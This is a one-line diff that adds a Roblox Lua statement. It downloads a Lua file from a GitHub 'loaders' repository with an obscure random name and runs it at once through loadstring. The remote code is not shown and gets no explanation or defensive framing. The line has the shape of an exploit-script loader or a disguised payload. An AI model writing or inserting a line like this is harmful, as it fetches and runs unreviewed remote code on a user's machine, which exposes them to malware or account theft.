@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/update-bathtub-universe-spam3-r9c6xjejoau58j.lua"))()
